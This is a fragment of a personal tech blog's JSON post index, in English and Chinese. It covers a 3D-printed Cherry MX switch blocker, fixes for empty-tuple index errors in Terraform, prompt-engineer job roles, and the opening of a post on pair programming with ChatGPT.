MX。","text":"您是否厌倦了不小心按到键盘上的错误按键？您是否发现自己因为流氓 Caps Lock 或 Windows 键而浪费宝贵的时间？或者您可能像我一样，在映射后拥有一个按键比实际需要的还多的键盘，留下不必要的杂乱。别担心，我的朋友，这个太常见的问题有一个解决方案：Cherry MX 开关的 3D 打印开关阻挡器！ 开关阻挡器的尺寸是 18.8x18.8mm 的完美正方形，高度为 1mm。然而，如果您担心阻挡 LED 灯光，您可能需要增加厚度。不过不用担心，因为您可以轻松修改设计以使其适合您。 但真正让这个开关阻挡器与众不同的是所有侧面的凹槽。这确保开关阻挡器牢固地固定在适当的位置，不会在最不方便的时候弹出。因此，无论您是在进行高风险游戏还是关键工作项目，您都可以放心，您的开关阻挡器会保持在原位。 最棒的部分是什么？您可以从 Tinkercad 下载此开关阻挡器的模型，这是一个免费的 3D 建模网站。因此，即使您没有任何 3D 建模技能，您仍然可以创建自己的自定义开关阻挡器！如果您担心成本，不用担心。您可以将许多开关阻挡器连接在一起以节省打印成本。事实上，当您从淘宝订购时，您可以以大约 10 美元的价格获得 40 个开关阻挡器，包括从大陆到香港的运费。 那么，您还在等什么？告别那些令人沮丧的意外按键，使用您自己的 Cherry MX 开关 3D 打印开关阻挡器，迎接更高效、更愉快的打字或游戏体验。打印愉快！ 开关阻挡器的 3D 模型：","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"3D printing","slug":"3D-printing","permalink":"https://neo01.com/tags/3D-printing/"}],"lang":"zh-CN"},{"title":"3D 列印 Cherry MX 開關阻擋器","slug":"2023/05/3D_Printed_Switch_Blocker_Cherry_MX-zh-TW","date":"un11fin11","updated":"un11fin11","comments":true,"path":"/zh-TW/2023/05/3D_Printed_Switch_Blocker_Cherry_MX/","permalink":"https://neo01.com/zh-TW/2023/05/3D_Printed_Switch_Blocker_Cherry_MX/","excerpt":"告別誤觸按鍵的困擾！自製 3D 列印開關阻擋器,讓你的鍵盤更完美。淘寶 40 個只要 10 美元!","text":"您是否厭倦了不小心按到鍵盤上的錯誤按鍵？您是否發現自己因為流氓 Caps Lock 或 Windows 鍵而浪費寶貴的時間？或者您可能像我一樣，在映射後擁有一個按鍵比實際需要的還多的鍵盤，留下不必要的雜亂。別擔心，我的朋友，這個太常見的問題有一個解決方案：Cherry MX 開關的 3D 列印開關阻擋器！ 開關阻擋器的尺寸是 18.8x18.8mm 的完美正方形，高度為 1mm。然而，如果您擔心阻擋 LED 燈光，您可能需要增加厚度。不過不用擔心，因為您可以輕鬆修改設計以使其適合您。 但真正讓這個開關阻擋器與眾不同的是所有側面的凹槽。這確保開關阻擋器牢固地固定在適當的位置，不會在最不方便的時候彈出。因此，無論您是在進行高風險遊戲還是關鍵工作專案，您都可以放心，您的開關阻擋器會保持在原位。 最棒的部分是什麼？您可以從 Tinkercad 下載此開關阻擋器的模型，這是一個免費的 3D 建模網站。因此，即使您沒有任何 3D 建模技能，您仍然可以建立自己的自訂開關阻擋器！如果您擔心成本，不用擔心。您可以將許多開關阻擋器連結在一起以節省列印成本。事實上，當您從淘寶訂購時，您可以以大約 10 美元的價格獲得 40 個開關阻擋器，包括從大陸到香港的運費。 那麼，您還在等什麼？告別那些令人沮喪的意外按鍵，使用您自己的 Cherry MX 開關 3D 列印開關阻擋器，迎接更高效、更愉快的打字或遊戲體驗。列印愉快！ 開關阻擋器的 3D 模型：","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"3D printing","slug":"3D-printing","permalink":"https://neo01.com/tags/3D-printing/"}],"lang":"zh-TW"},{"title":"在 Terraform 中处理列表中空元组的无效索引","slug":"2023/04/Handling_invalid_index_on_empty_tuple_from_list_in_Terraform-zh-CN","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-CN/2023/04/Handling_invalid_index_on_empty_tuple_from_list_in_Terraform/","permalink":"https://neo01.com/zh-CN/2023/04/Handling_invalid_index_on_empty_tuple_from_list_in_Terraform/","excerpt":"功能切换时遇到空元组错误？掌握 try()、条件表达式和展开表达式等四种解决方案。","text":"在 Terraform 中使用 count = 0 来实现功能切换是很常见的。然而，当它在资源中实现且功能被停用时，可能会导致空元组错误。元组是一种可以包含任意数量不同类型元素的列表类型。索引零用于访问已启用的资源，例如 module.feature[0].id。当资源被停用时，元组为空，且 module.feature[0] 不存在，导致错误。 例如，以下代码运行良好： locals &#123; my_tuple &#x3D; [ &#123; name: &quot;a&quot; &#125;, &#123; name: &quot;b&quot; &#125; ] result &#x3D; local.my_tuple[0].name &#125; output &quot;result&quot; &#123; value &#x3D; local.result &#125; 输出： $ terraform plan Changes to Outputs: + result &#x3D; &quot;a&quot; 然而，当 my_tuple 为空时会抛出错误。 locals &#123; my_tuple &#x3D; [] result &#x3D; local.my_tuple[0].name &#125; output &quot;result&quot; &#123; value &#x3D; local.result &#125; 输出： $ terraform plan ╷ │ Error: Invalid index │ │ on main.tf line 5, in locals: │ 5: value &#x3D; local.my_tuple[0].name │ ├──────────────── │ │ local.my_tuple is empty tuple │ │ The given key does not identify an element in this collection value: the collection has no elements. 功能切换是空元组的常见使用案例。然而，空元组还有其他使用案例。例如，如果您使用的模块返回元组，您可能想处理元组为空的情况。 以下是可用于在 Terraform 中处理空元组的技术， 条件表达式 处理空元组的直接方法是在尝试访问元素之前使用条件表达式检查元组是否为空。以下是如何使用条件表达式的示例： locals &#123; my_tuple &#x3D; [] result &#x3D; length(local.my_tuple) &gt; 0 ? local.my_tuple[0].name : &quot;default-value&quot; &#125; 在此示例中，length() 函数用于检查 my_tuple 是否为空。如果 my_tuple 不为空，则第一个元素 ([0]) 中的 name 被分配给 result 变量。如果 my_tuple 为空，则&quot;default-value&quot;被分配给 result 变量。不会抛出空元组错误，因为当 my_tuple 为空时不会评估 local.my_tuple[0].name。 当变量名称很长时，这可能难以阅读，因为变量名称在条件表达式中重复了两次。 try 函数 处理空元组的另一种方法是使用 try() 函数。try() 函数用于尝试访问值，如果值未定义则提供默认值。以下是如何使用 try() 函数的示例： locals &#123; my_tuple &#x3D; [] result &#x3D; try(local.my_tuple[0].name, &quot;default-value&quot;) &#125; 在此示例中，try() 函数用于尝试访问 my_tuple 第一个元素 ([0]) 中的 name。由于 my_tuple 为空，字符串&quot;default-value&quot;被用作 value 的默认值。 for 表达式 在 Terraform 0.13.0 中，您可以使用 for 表达式来处理空元组： locals &#123; my_tuple &#x3D; [] result &#x3D; [for i in local.my_tuple: i.name] &#125; 这是可读性最低的方法，但带我们进入下面的展开表达式： ## 展开表达式 locals &#123; my_tuple &#x3D; [] result &#x3D; local.my_tuple[*].name &#125; for 表达式和展开表达式在 Terraform 0.12.29 中不受支持，但在 Terraform 0.13.0 及更高版本中受支持。此外，如果 my_tuple 为空，两者都会返回空元组，与可以指定默认值的条件表达式和 try() 函数不同。 旧版展开表达式 local.my_tuple.*.name 在 Terraform 0.12.29 及更高版本（截至本文发布日期为 v1.4）中也受支持。然而，不建议使用此方法，因为它可能在未来版本中被移除。 有关展开表达式的更多信息， https://developer.hashicorp.com/terraform/language/expressions/splat 值得注意的是，表达式的结果是元组。您可能需要使用 tolist() 函数将其转换为列表，或者如果您想删除重复项和/或排序项目，则使用 toset() 函数。compact() 函数可用于从列表中删除空字符串和 null 值。您还可以使用 join() 函数将列表转换为字符串。 使用动态块的 meta-argument for_each 进行功能切换 使用带有动态块的 for_each meta-argument 可以是功能切换的一种方法，但超出了本文的范围。 参考资料 https://support.hashicorp.com/hc/en-us/articles/9471971461651-ERROR-Invalid-index-on-empty-tuple","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}],"lang":"zh-CN"},{"title":"Handling invalid index on empty tuple from list in Terraform","slug":"2023/04/Handling_invalid_index_on_empty_tuple_from_list_in_Terraform","date":"un33fin33","updated":"un66fin66","comments":true,"path":"2023/04/Handling_invalid_index_on_empty_tuple_from_list_in_Terraform/","permalink":"https://neo01.com/2023/04/Handling_invalid_index_on_empty_tuple_from_list_in_Terraform/","excerpt":"Hit empty tuple errors with feature toggles? Master four solutions: try(), conditional expressions, splat expressions, and for loops to handle empty tuples in Terraform gracefully.","text":"It is common to use count = 0 to achieve feature toggle in Terraform. However, it could result in an empty tuple error when it is implemented in a resource and the feature is disabled. A tuple is a type of list that can contain any number of elements of different types. Index zero is used to access the enabled resource, e.g., module.feature[0].id. The tuple is empty when the resource is disabled, and module.feature[0] does not exist, resulting in an error. For example, below code runs well: locals &#123; my_tuple &#x3D; [ &#123; name: &quot;a&quot; &#125;, &#123; name: &quot;b&quot; &#125; ] result &#x3D; local.my_tuple[0].name &#125; output &quot;result&quot; &#123; value &#x3D; local.result &#125; Output: $ terraform plan Changes to Outputs: + result &#x3D; &quot;a&quot; However, it will throw an error when my_tuple is empty. locals &#123; my_tuple &#x3D; [] result &#x3D; local.my_tuple[0].name &#125; output &quot;result&quot; &#123; value &#x3D; local.result &#125; Output: $ terraform plan ╷ │ Error: Invalid index │ │ on main.tf line 5, in locals: │ 5: value &#x3D; local.my_tuple[0].name │ ├──────────────── │ │ local.my_tuple is empty tuple │ │ The given key does not identify an element in this collection value: the collection has no elements. Feature toggling is a common use case for empty tuples. However, there are other use cases for empty tuples. For example, if you are using a module that returns a tuple, you may want to handle the case where the tuple is empty. Here are techniques that can be used to handle empty tuples in Terraform, Conditional Expressions A straightforward approach to handling empty tuples is to use a conditional expression to check whether the tuple is empty before trying to access an element. Here’s an example of how to use a conditional expression: locals &#123; my_tuple &#x3D; [] result &#x3D; length(local.my_tuple) &gt; 0 ? local.my_tuple[0].name : &quot;default-value&quot; &#125; In this example, the length() function is used to check whether my_tuple is empty. If my_tuple is not empty, name in the first element ([0]) is assigned to the result variable. If my_tuple is empty, “default-value” is assigned to the result variable. No empty tuple error is thrown because local.my_tuple[0].name is not evaluated when my_tuple is empty. This can be difficult to read when the variable name is long, as the variable name is repeated twice in the conditional expression. try Function Another approach to handling empty tuples is to use the try() function. The try() function is used to attempt to access a value and provide a default value if the value is undefined. Here’s an example of how to use the try() function: locals &#123; my_tuple &#x3D; [] result &#x3D; try(local.my_tuple[0].name, &quot;default-value&quot;) &#125; In this example, the try() function is used to attempt to access name in the first element ([0]) of my_tuple. Since my_tuple is empty, the string “default-value” is used as a default value for value. for Expression In Terraform 0.13.0 you can use for expressions to handle empty tuples: locals &#123; my_tuple &#x3D; [] result &#x3D; [for i in local.my_tuple: i.name] &#125; This is the least readable approach, but brings us to splat expressions below: ## Splat Expressions locals &#123; my_tuple &#x3D; [] result &#x3D; local.my_tuple[*].name &#125; Both for expressions and splat expressions are not supported in Terraform 0.12.29, but they are supported in Terraform 0.13.0 and later. Also, both return an empty tuple if the my_tuple is empty, unlike the conditional expression and try() function which a default value can be specified. A legacy splat expression local.my_tuple.*.name is also supported in Terraform 0.12.29 and later (v1.4 as of date of this post). However, this is not recommended as it could be removed in a future release. More information about splat expression, https://developer.hashicorp.com/terraform/language/expressions/splat It is worth noting that the result from the expressions is a tuple. You may need to convert it to a list with tolist() function, or toset() function if you want to remove duplicates and/or order the items. compact() function can be used to remove empty string and null values from a list. You can also use join() function to convert a list to a string. feature toggling with meta-argument for_each with dynamic blocks Use of for_each meta-argument with dynamic blocks can be an approach for feature toggling but beyond the scope of this post. References https://support.hashicorp.com/hc/en-us/articles/9471971461651-ERROR-Invalid-index-on-empty-tuple","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}]},{"title":"在 Terraform 中處理列表中空元組的無效索引","slug":"2023/04/Handling_invalid_index_on_empty_tuple_from_list_in_Terraform-zh-TW","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-TW/2023/04/Handling_invalid_index_on_empty_tuple_from_list_in_Terraform/","permalink":"https://neo01.com/zh-TW/2023/04/Handling_invalid_index_on_empty_tuple_from_list_in_Terraform/","excerpt":"功能切換時遇到空元組錯誤？掌握 try()、條件表達式和展開表達式等四種解決方案。","text":"在 Terraform 中使用 count = 0 來實現功能切換是很常見的。然而，當它在資源中實作且功能被停用時，可能會導致空元組錯誤。元組是一種可以包含任意數量不同類型元素的列表類型。索引零用於存取已啟用的資源，例如 module.feature[0].id。當資源被停用時，元組為空，且 module.feature[0] 不存在，導致錯誤。 例如，以下程式碼執行良好： locals &#123; my_tuple &#x3D; [ &#123; name: &quot;a&quot; &#125;, &#123; name: &quot;b&quot; &#125; ] result &#x3D; local.my_tuple[0].name &#125; output &quot;result&quot; &#123; value &#x3D; local.result &#125; 輸出： $ terraform plan Changes to Outputs: + result &#x3D; &quot;a&quot; 然而，當 my_tuple 為空時會拋出錯誤。 locals &#123; my_tuple &#x3D; [] result &#x3D; local.my_tuple[0].name &#125; output &quot;result&quot; &#123; value &#x3D; local.result &#125; 輸出： $ terraform plan ╷ │ Error: Invalid index │ │ on main.tf line 5, in locals: │ 5: value &#x3D; local.my_tuple[0].name │ ├──────────────── │ │ local.my_tuple is empty tuple │ │ The given key does not identify an element in this collection value: the collection has no elements. 功能切換是空元組的常見使用案例。然而，空元組還有其他使用案例。例如，如果您使用的模組返回元組，您可能想處理元組為空的情況。 以下是可用於在 Terraform 中處理空元組的技術， 條件表達式 處理空元組的直接方法是在嘗試存取元素之前使用條件表達式檢查元組是否為空。以下是如何使用條件表達式的範例： locals &#123; my_tuple &#x3D; [] result &#x3D; length(local.my_tuple) &gt; 0 ? local.my_tuple[0].name : &quot;default-value&quot; &#125; 在此範例中，length() 函式用於檢查 my_tuple 是否為空。如果 my_tuple 不為空，則第一個元素 ([0]) 中的 name 被指派給 result 變數。如果 my_tuple 為空，則「default-value」被指派給 result 變數。不會拋出空元組錯誤，因為當 my_tuple 為空時不會評估 local.my_tuple[0].name。 當變數名稱很長時，這可能難以閱讀，因為變數名稱在條件表達式中重複了兩次。 try 函式 處理空元組的另一種方法是使用 try() 函式。try() 函式用於嘗試存取值，如果值未定義則提供預設值。以下是如何使用 try() 函式的範例： locals &#123; my_tuple &#x3D; [] result &#x3D; try(local.my_tuple[0].name, &quot;default-value&quot;) &#125; 在此範例中，try() 函式用於嘗試存取 my_tuple 第一個元素 ([0]) 中的 name。由於 my_tuple 為空，字串「default-value」被用作 value 的預設值。 for 表達式 在 Terraform 0.13.0 中，您可以使用 for 表達式來處理空元組： locals &#123; my_tuple &#x3D; [] result &#x3D; [for i in local.my_tuple: i.name] &#125; 這是可讀性最低的方法，但帶我們進入下面的展開表達式： ## 展開表達式 locals &#123; my_tuple &#x3D; [] result &#x3D; local.my_tuple[*].name &#125; for 表達式和展開表達式在 Terraform 0.12.29 中不受支援，但在 Terraform 0.13.0 及更高版本中受支援。此外，如果 my_tuple 為空，兩者都會返回空元組，與可以指定預設值的條件表達式和 try() 函式不同。 舊版展開表達式 local.my_tuple.*.name 在 Terraform 0.12.29 及更高版本（截至本文發布日期為 v1.4）中也受支援。然而，不建議使用此方法，因為它可能在未來版本中被移除。 有關展開表達式的更多資訊， https://developer.hashicorp.com/terraform/language/expressions/splat 值得注意的是，表達式的結果是元組。您可能需要使用 tolist() 函式將其轉換為列表，或者如果您想刪除重複項和/或排序項目，則使用 toset() 函式。compact() 函式可用於從列表中刪除空字串和 null 值。您還可以使用 join() 函式將列表轉換為字串。 使用動態區塊的 meta-argument for_each 進行功能切換 使用帶有動態區塊的 for_each meta-argument 可以是功能切換的一種方法，但超出了本文的範圍。 參考資料 https://support.hashicorp.com/hc/en-us/articles/9471971461651-ERROR-Invalid-index-on-empty-tuple","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}],"lang":"zh-TW"},{"title":"AI 解鎖的新工作角色 - 提示工程師！","slug":"2023/04/New_Unlocked_Job_Roles_for_AI_Prompt_Engineers-zh-TW","date":"un00fin00","updated":"un00fin00","comments":true,"path":"/zh-TW/2023/04/New_Unlocked_Job_Roles_for_AI_Prompt_Engineers/","permalink":"https://neo01.com/zh-TW/2023/04/New_Unlocked_Job_Roles_for_AI_Prompt_Engineers/","excerpt":"AI 不是取代工作，而是創造新職位！探索圖形提示工程師、法律提示工程師等新興職業。","text":"從前，在一個與我們的世界並無太大不同的世界裡，人們對 AI 的崛起以及它將如何取代他們的工作感到焦慮。但在這個神奇的世界裡，他們很快發現，隨著 AI 的發展，新的令人興奮的工作角色正在被解鎖，例如「提示工程師」。 認識提示工程師 在這個生成式 AI 發展的魔法時代，我們發現自己擁有創新的職稱，如「提示工程師」。想像一個對平面設計有敏銳眼光並對 Stable Diffusion 和 Midjourney 等 AI 圖像生成模型充滿熱情的人。這些有才華的人負責製作課程材料、示範和範例，以教導其他人如何使用 AI 建立專業外觀的平面設計資產。 來自 https://prompthero.com/jobs/177145-prompt-engineer-for-graphic-design-contractor-at-prompthero 的工作描述專家， …可以展示卓越的能力並證明您的工作流程產生了人們實際最終使用的驚人平面設計資產。 雖然圖形提示工程師專注於圖形設計的技術方面，例如開發提示、訓練模型或最佳化效能，但傳統的圖形設計師專注於藝術方面，例如建立視覺概念、選擇顏色和設計版面配置。 透過合作，圖形提示工程師和傳統圖形設計師可以利用彼此的優勢來建立有效且視覺上吸引人的產品或專案。例如，工程師可能能夠開發提示，使設計師能夠建立更複雜和動態的圖形，而設計師可以提供創意輸入，以確保圖形在美學上令人愉悅並與專案的目標一致。 我們還看到了「法律提示工程師」的出現。這些專業人士具有法律背景，並對 GPT-3 和 ChatGPT 等語言模型有深入的了解。他們與律師和律師事務所密切合作，透過為各種法律和非法律使用案例設計和開發高品質的提示來革新法律行業。 您可以在 https://prompthero.com/jobs/prompt-engineering-jobs 中找到更多工作描述 傳統平面設計師可以成為提示工程師嗎？ 是的，絕對可以！一些傳統的平面設計師已經在利用 AI 技術提供的機會。他們使用 AI 模型為客戶建立高品質的圖形，這為他們節省了時間和金錢。他們還使用 AI 為自己的個人專案建立圖形，這使他們能夠表達對設計/法律的創造力和熱情。憑藉熱情，他們更多地了解 AI 技術並成為提示工程師。 如何成為提示工程師 既然您已經聽說了這些迷人的角色，您可能想知道如何自己成為提示工程師。以下是一些建議： 對 AI 模型有深入的了解： 花時間學習用於圖像生成或自然語言處理的 AI 模型。探索 OpenAI 等平台，以深入了解該領域的最新發展。 發展您的利基專業知識： 根據您想成為的提示工程師類型，專注於發展您的平面設計技能或加深您的法律知識，例如。 獲得實踐經驗： 練習使用 AI 模型和提示在您選擇的利基中建立內容、設計或解決方案。這將幫助您建立展示您的 AI 生成作品的作品集。 保持對 AI 行業的了解： 讓自己了解 AI 技術的最新進展和突破。這將幫助您保持競爭力並了解就業市場的變化。 下一個 AI 解鎖的工作角色 隨著 AI 世界的持續成長和轉型，我們看到更多創意工作角色出現只是時間問題。一種可能性是「AI 內容策略師」，專門設計利用 AI 生成內容進行行銷、SEO 和社群媒體活動的內容策略。 AI 建立的工作角色轉折 但如果這些新的工作角色實際上是由 AI 本身建立的呢？想像一個 AI 系統生成一個與不斷發展的就業市場需求完美一致的工作角色清單。這並非完全不可能，這將證明 AI 的驚人進步以及它可以創造的無限機會。所以，親愛的讀者，不用擔心，因為人類在就業市場的未來仍然充滿機會和潛力！ 總之，隨著 AI 格局的發展，我們可以期待看到更多令人興奮的工作角色出現，為專業人士提供將他們的熱情與 AI 技術結合的機會。未來是光明的，可能性是無限的！","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-TW"},{"title":"New Unlocked Job Roles for AI - Prompt Engineers!","slug":"2023/04/New_Unlocked_Job_Roles_for_AI_Prompt_Engineers","date":"un00fin00","updated":"un66fin66","comments":true,"path":"2023/04/New_Unlocked_Job_Roles_for_AI_Prompt_Engineers/","permalink":"https://neo01.com/2023/04/New_Unlocked_Job_Roles_for_AI_Prompt_Engineers/","excerpt":"AI isn't replacing jobs—it's creating new ones! Discover emerging roles like Graphics Prompt Engineers and Legal Prompt Engineers. Learn how to become one and what's next.","text":"Once upon a time, in a world not so different from ours, people were anxious about the rise of AI and how it would take over their jobs. But in this magical world, they soon discovered that, as AI developed, new and exciting job roles were being unlocked, like that of a “Prompt Engineer.” Meet the Prompt Engineer In this enchanted era of generative AI development, we find ourselves with innovative job titles like “Prompt Engineer.” Imagine someone who has a keen eye for graphic design and a passion for AI image generation models like Stable Diffusion and Midjourney. These talented individuals are tasked with crafting course materials, demos, and examples to teach others how to create professional-looking graphic design assets using AI. Job description expert from https://prompthero.com/jobs/177145-prompt-engineer-for-graphic-design-contractor-at-prompthero, …can demonstrate exceptional ability and prove that your workflow yields amazing graphic design assets people actually end up using. While graphics prompt engineers focus on the technical aspects of graphics design, such as developing prompt, train models, or optimizing performance, traditional graphics designers focus on the artistic aspects, such as creating visual concepts, selecting colors, and designing layouts. By working together, graphics prompt engineers and traditional graphics designers can leverage each other’s strengths to create effective and visually appealing products or projects. For example, the engineer may be able to develop prompt that enables a designer to create more complex and dynamic graphics, while the designer can provide creative input to ensure that the graphics are aesthetically pleasing and aligned with the project’s objectives. We’ve also seen the emergence of “Legal Prompt Engineers.” These professionals have a background in law and deep knowledge of language models like GPT-3 and ChatGPT. They work closely with lawyers and law firms to revolutionize the legal industry by designing and developing high-quality prompts for various legal and non-legal use cases. You can find more job description in https://prompthero.com/jobs/prompt-engineering-jobs Can a traditional graphic designer become a Prompt Engineer? Yes, absolutely! Some traditional graphic designers are already taking advantage of the opportunities offered by AI technology. They’re using AI models to create high-quality graphics for their clients, which saves them time and money. And they’re also using AI to create graphics for their own personal projects, which allows them to express their creativity and passion for design/law. With the passion they learn more about AI technology and become a Prompt Engineer. How to Become a Prompt Engineer Now that you’ve heard about these fascinating roles, you might be wondering how to become a Prompt Engineer yourself. Here are some suggestions: Develop a strong understanding of AI models: Spend time learning about the AI models used for image generation or natural language processing. Explore platforms like OpenAI to gain insights into the latest developments in the field. Develop your niche expertise: Depending on the type of Prompt Engineer you want to become, focus on developing your graphic design skills or deepening your legal knowledge, for example. Get hands-on experience: Practice working with AI models and prompt to create content, designs, or solutions in your chosen niche. This will help you build a portfolio showcasing your AI-generated work. Stay current with the AI industry: Keep yourself updated on the latest advancements and breakthroughs in AI technology. This will help you stay competitive and informed about changes in the job market. The Next AI-Unlocked Job Role As the world of AI continues to grow and transform, it’s only a matter of time before we see even more creative job roles emerge. One possibility is the “AI Content Strategist,” who specializes in designing content strategies that leverage AI-generated content for marketing, SEO, and social media campaigns. The AI-Created Job Role Twist But what if these new job roles were actually created by AI itself? Imagine an AI system generating a list of job roles that perfectly align with the needs of an ever-evolving job market. It’s not entirely impossible, and it would be a testament to the incredible advancements in AI and the limitless opportunities it can create. So, no need to worry, dear reader, for the future of mankind in the job market is still opportunistic and filled with potential! In conclusion, as the AI landscape evolves, we can expect to see even more exciting job roles emerge, offering opportunities for professionals to combine their passions with AI technology. The future is bright, and the possibilities are endless!","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}]},{"title":"AI 解锁的新工作角色 - 提示工程师！","slug":"2023/04/New_Unlocked_Job_Roles_for_AI_Prompt_Engineers-zh-CN","date":"un00fin00","updated":"un00fin00","comments":true,"path":"/zh-CN/2023/04/New_Unlocked_Job_Roles_for_AI_Prompt_Engineers/","permalink":"https://neo01.com/zh-CN/2023/04/New_Unlocked_Job_Roles_for_AI_Prompt_Engineers/","excerpt":"AI 不是取代工作，而是创造新职位！探索图形提示工程师、法律提示工程师等新兴职业。","text":"从前，在一个与我们的世界并无太大不同的世界里，人们对 AI 的崛起以及它将如何取代他们的工作感到焦虑。但在这个神奇的世界里，他们很快发现，随着 AI 的发展，新的令人兴奋的工作角色正在被解锁，例如&quot;提示工程师&quot;。 认识提示工程师 在这个生成式 AI 发展的魔法时代，我们发现自己拥有创新的职称，如&quot;提示工程师&quot;。想象一个对平面设计有敏锐眼光并对 Stable Diffusion 和 Midjourney 等 AI 图像生成模型充满热情的人。这些有才华的人负责制作课程材料、演示和示例，以教导其他人如何使用 AI 创建专业外观的平面设计资产。 来自 https://prompthero.com/jobs/177145-prompt-engineer-for-graphic-design-contractor-at-prompthero 的工作描述专家， …可以展示卓越的能力并证明您的工作流程产生了人们实际最终使用的惊人平面设计资产。 虽然图形提示工程师专注于图形设计的技术方面，例如开发提示、训练模型或优化性能，但传统的图形设计师专注于艺术方面，例如创建视觉概念、选择颜色和设计布局。 通过合作，图形提示工程师和传统图形设计师可以利用彼此的优势来创建有效且视觉上吸引人的产品或项目。例如，工程师可能能够开发提示，使设计师能够创建更复杂和动态的图形，而设计师可以提供创意输入，以确保图形在美学上令人愉悦并与项目的目标一致。 我们还看到了&quot;法律提示工程师&quot;的出现。这些专业人士具有法律背景，并对 GPT-3 和 ChatGPT 等语言模型有深入的了解。他们与律师和律师事务所密切合作，通过为各种法律和非法律使用案例设计和开发高质量的提示来革新法律行业。 您可以在 https://prompthero.com/jobs/prompt-engineering-jobs 中找到更多工作描述 传统平面设计师可以成为提示工程师吗？ 是的，绝对可以！一些传统的平面设计师已经在利用 AI 技术提供的机会。他们使用 AI 模型为客户创建高质量的图形，这为他们节省了时间和金钱。他们还使用 AI 为自己的个人项目创建图形，这使他们能够表达对设计/法律的创造力和热情。凭借热情，他们更多地了解 AI 技术并成为提示工程师。 如何成为提示工程师 既然您已经听说了这些迷人的角色，您可能想知道如何自己成为提示工程师。以下是一些建议： 对 AI 模型有深入的了解： 花时间学习用于图像生成或自然语言处理的 AI 模型。探索 OpenAI 等平台，以深入了解该领域的最新发展。 发展您的利基专业知识： 根据您想成为的提示工程师类型，专注于发展您的平面设计技能或加深您的法律知识，例如。 获得实践经验： 练习使用 AI 模型和提示在您选择的利基中创建内容、设计或解决方案。这将帮助您建立展示您的 AI 生成作品的作品集。 保持对 AI 行业的了解： 让自己了解 AI 技术的最新进展和突破。这将帮助您保持竞争力并了解就业市场的变化。 下一个 AI 解锁的工作角色 随着 AI 世界的持续增长和转型，我们看到更多创意工作角色出现只是时间问题。一种可能性是&quot;AI 内容策略师&quot;，专门设计利用 AI 生成内容进行营销、SEO 和社交媒体活动的内容策略。 AI 创建的工作角色转折 但如果这些新的工作角色实际上是由 AI 本身创建的呢？想象一个 AI 系统生成一个与不断发展的就业市场需求完美一致的工作角色清单。这并非完全不可能，这将证明 AI 的惊人进步以及它可以创造的无限机会。所以，亲爱的读者，不用担心，因为人类在就业市场的未来仍然充满机会和潜力！ 总之，随着 AI 格局的发展，我们可以期待看到更多令人兴奋的工作角色出现，为专业人士提供将他们的热情与 AI 技术结合的机会。未来是光明的，可能性是无限的！","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-CN"},{"title":"Pair Programming with ChatGPT - A Developer's Dream Come True","slug":"2023/03/Pair_Programming_with_ChatGPT_A_Developer_s_Dream_Come_True","date":"un44fin44","updated":"un66fin66","comments":true,"path":"2023/03/Pair_Programming_with_ChatGPT_A_Developer_s_Dream_Come_True/","permalink":"https://neo01.com/2023/03/Pair_Programming_with_ChatGPT_A_Developer_s_Dream_Come_True/","excerpt":"ChatGPT isn't replacing developers—it's the perfect pair programming partner! Learn the magic question \"can you propose better coding?\" for meaningful code reviews and refactoring.","text":"As a full stack developer, I have practiced pair programming with many humans over the years. However, recently I had the opportunity to work with ChatGPT, a large language model trained by OpenAI, and it was a game-changer. I found that ChatGPT was not replacing my role, but rather working as a pair programming companion, providing me with valuable insights and perspectives. Let’s dive into how it transformed my pair programming experience! Human and ChatGPT: A Perfect Synergy The partnership between a human developer and ChatGPT is quite unique. Here’s my typical loop: Requirements Gathering: We human developer provides the requirements for a specific feature or function. ChatGPT write code and we human review. Summarizing Requirements: I found it very useful to ask ChatGPT summarizes my requirements, as I usually not provide my requirements in one go. This helps me to check if we are in the same page. Unit Test Template: ChatGPT generates a unit test template based on the summarized requirements. Human Completes and Refines Unit Test: We human developer completes and refines the unit test and provides feedback to ChatGPT, refining their understanding of the task. Its turn for ChatGPT to review my code In reverse, the human can write a program and ask ChatGPT to review and summarize the code. This process helps identify potential issues and ensures that the code meets the desired requirements. However, sometime you may need to help ChatGPT a little instead of throwing a piece of code. For example, Try #1, simply ask to review Prompt: review following terraform code in main.tf. resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; condition &#x3D;&#x3D; true ? &quot;aaa,bbb,ccc,$&#123;var.b&#125;&quot; : &quot;$&#123;var.a&#125;,aaa,bbb,ccc,$&#123;var.b&#125;&quot; &#125; Response The code you provided creates a resource named “some_resource” with the name “resource_name” and sets the “name” attribute to “some_name”. Additionally, it sets the “value” attribute based on a condition. If the “condition” variable is true, then “value” is set to “aaa,bbb,ccc,${var.b}”. If “condition” is false, then “value” is set to “${var.a},aaa,bbb,ccc,$${var.b}”. The code appears to be valid and functional, assuming that the variables “a”, “b”, and “condition” have been properly defined. However, it’s important to ensure that the resource type and its attributes are correct and properly configured for your infrastructure needs. Additionally, it’s a good practice to use descriptive names for resources and attributes to make it easier to understand the purpose of the code. The above sounds meaningless. Lets refine our question a little bit Try #2, tell what you want from code review Prompt: review following terraform code in main.tf. can you propose better coding? resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; condition &#x3D;&#x3D; true ? 